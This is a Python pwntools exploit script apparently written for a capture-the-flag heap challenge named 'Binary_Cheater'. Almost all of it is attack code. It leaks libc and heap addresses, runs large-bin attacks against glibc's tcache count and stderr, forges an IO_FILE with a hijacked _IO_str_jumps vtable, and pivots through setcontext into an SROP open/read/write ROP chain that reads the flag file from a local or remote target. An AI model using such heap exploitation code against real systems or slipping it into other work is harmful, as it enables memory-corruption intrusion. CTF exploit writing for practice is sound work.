from pwn import *

elf = None
libc = None
file_name = "./Binary_Cheater"

# context.timeout = 1

def get_file(dic=""):
    context.binary = dic + file_name
    return context.binary


def get_libc(dic=""):
    libc = None
    try:
        data = os.popen("ldd {}".format(dic + file_name)).read()
        for i in data.split('\n'):
            libc_info = i.split("=>")
            if len(libc_info) == 2:
                if "libc" in libc_info[0]:
                    libc_path = libc_info[1].split(' (')
                    if len(libc_path) == 2:
                        libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                        return libc
    except:
        pass
    if context.arch == 'amd64':
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    elif context.arch == 'i386':
        try:
            libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
        except:
            libc = ELF("/lib32/libc.so.6", checksec=False)
    return libc


def get_sh(Use_other_libc=False, Use_ssh=False):
    global libc
    if args['REMOTE']:
        if Use_other_libc:
            libc = ELF("./libc.so.6", checksec=False)
        if Use_ssh:
            s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
            return s.process(file_name)
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process(file_name)


def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if libc == True:
        return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    elif int_mode:
        return_address = int(sh.recvuntil(end_string, drop=True), 16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
    elif context.arch == 'amd64':
        return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
    else:
        return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address



def Attack(target=None, sh=None, elf=None, libc=None):
    if sh is None:
        from Class.Target import Target
        assert target is not None
        assert isinstance(target, Target)
        sh = target.sh
        elf = target.elf
        libc = target.libc
    assert isinstance(elf, ELF)
    assert isinstance(libc, ELF)
    try_count = 0
    while try_count < 3:
        try_count += 1
        try:
            pwn(sh, elf, libc)
            break
        except KeyboardInterrupt:
            break
        except EOFError:
            if target is not None:
                sh = target.get_sh()
                target.sh = sh
                if target.connect_fail:
                    return 'ERROR : Can not connect to target server!'
            else:
                sh = get_sh()
    flag = get_flag(sh)
    return flag


def choice(idx):
    sh.sendlineafter(">> ", str(idx))


def add(size, content):
    choice(1)
    sh.sendlineafter("Size: ", str(size))
    sh.sendlineafter("Content: ", str(content))


def edit(idx, content):
    choice(2)
    sh.sendlineafter("Index: ", str(idx))
    sh.sendlineafter("Content: ", str(content))


def show(idx):
    choice(4)
    sh.sendlineafter("Index: ", str(idx))


def delete(idx):
    choice(3)
    sh.sendlineafter("Index: ", str(idx))


def pwn(sh, elf, libc):
    context.log_level = "debug"
    add(0x418, '0')
    add(0x418, '1')
    add(0x428, '2')
    add(0x428, '3')
    delete(2)
    add(0x450, '4')
    show(2)
    libc_base = get_address(sh, True, info="libc_base:\t", offset=-0x1e3ff0)

    free_hook_addr = libc_base + 0x1e6e40
    setcontext_addr = libc_base + 0x53030
    main_arena_addr = libc_base + 0x1e3ff0
    global_max_fast = libc_base + 0x1e6e98
    mpcount = libc_base + 0x1e32d0
    free_hook_ptr_addr = libc_base + 0x1e2ed8
    stderr_addr = libc_base + 0x1e47a0
    IO_str_jumps = libc_base + 0x1e5580

    delete(0)
    edit(2, p64(main_arena_addr) * 2 + p64(0) + p64(stderr_addr - 0x20))
    add(0x450, '5')
    show(2)
    heap_base = u64(sh.recvuntil('\n', drop=True)[-6:].ljust(8, '\x00')) - 0x2b0
    log.success("heap_base:\t" + hex(heap_base))

    # recover
    edit(2, p64(heap_base + 0x2b0) + p64(main_arena_addr) + p64(heap_base + 0x2b0) + p64(heap_base + 0x2b0))
    edit(0, p64(main_arena_addr) + p64(heap_base + 0xaf0) * 3)

    add(0x418, '6')
    add(0x428, '7')

    add(0x450, '8')
    add(0x450, '9')
    add(0x450, '10')
    delete(8)
    delete(9)
    delete(10)

    delete(7)
    add(0x450, '11')
    edit(7, p64(main_arena_addr) * 2 + p64(0) + p64(mpcount - 0x20)  + p64(free_hook_addr)*0x50)
    delete(6)
    add(0x450, '12')

    # recover
    # edit(7, p64(heap_base + 0x2b0) + p64(main_arena_addr) + p64(heap_base + 0x2b0) + p64(heap_base + 0x2b0))
    # edit(6, p64(main_arena_addr) + p64(heap_base + 0xaf0) * 3)

    new_size = 0x1592
    old_blen = (new_size - 100) // 2
    fake_IO_FILE = 2 * p64(0)
    fake_IO_FILE += p64(1)  # change _IO_write_base = 1
    fake_IO_FILE += p64(0xffffffffffff)  # change _IO_write_ptr = 0xffffffffffff
    fake_IO_FILE += p64(0)
    fake_IO_FILE += p64(heap_base + 0x2080)  # _IO_buf_base
    fake_IO_FILE += p64(heap_base + 0x2080 + old_blen)  # _IO_buf_end
    # old_blen = _IO_buf_end - _IO_buf_base
    # new_size = 2 * old_blen + 100;
    fake_IO_FILE = fake_IO_FILE.ljust(0x78, '\x00')
    fake_IO_FILE += p64(heap_base) # change _lock = writable address
    fake_IO_FILE = fake_IO_FILE.ljust(0xB0, '\x00')
    fake_IO_FILE += p64(0)  # change _mode = 0
    fake_IO_FILE = fake_IO_FILE.ljust(0xC8, '\x00')
    fake_IO_FILE += p64(IO_str_jumps + 0x18 - 0x38)  # change vtable

    edit(6, fake_IO_FILE)
    edit(0, '\x01')
    
    # gdb.attach(sh)
    # pause()
    # heap_base + 0x2080

    gadget_addr = libc_base + 0x000000000014b760  #: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    pop_rdi_addr = libc_base + 0x2858f
    pop_rsi_addr = libc_base + 0x2ac3f
    pop_rdx_addr = libc_base + 0x5216
    pop_rax_addr = libc_base + 0x45580
    syscall_addr = libc_base + 0x611ea

    # SROP
    fake_frame_addr = heap_base + 0x2080
    frame = SigreturnFrame()
    frame.rax = 2
    frame.rdi = fake_frame_addr + 0xF8
    frame.rsi = 0
    frame.rdx = 0x100
    frame.rsp = fake_frame_addr + 0xF8 + 0x10
    frame.rip = pop_rdi_addr + 1  # : ret

    rop_data = [
        pop_rax_addr,  # sys_open('flag', 0)
        2,
        syscall_addr,

        pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)
        0,
        pop_rdi_addr,
        3,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        syscall_addr,

        pop_rax_addr,  # sys_write(1, heap, 0x100)
        1,
        pop_rdi_addr,
        1,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        syscall_addr
    ]

    payload = (p64(gadget_addr) + p64(fake_frame_addr) + p64(0) * 2 + p64(setcontext_addr + 61) +
               str(frame)[ 0x28:]).ljust(0xF8, '\x00') + "flag\x00\x00\x00\x00" + p64(0) + flat(rop_data)
    edit(9, payload)

    add(0x430, '13')
    edit(10, 'a' * 0x438 + p64(0x3fe))
    gdb.attach(sh, "b *__vfprintf_internal+273")
    choice(1)
    sh.sendlineafter("Size: ", str(0x440))
    sh.interactive()


if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
    sh.close()
    log.success('The flag is ' + re.search(r'flag{.+}', flag).group())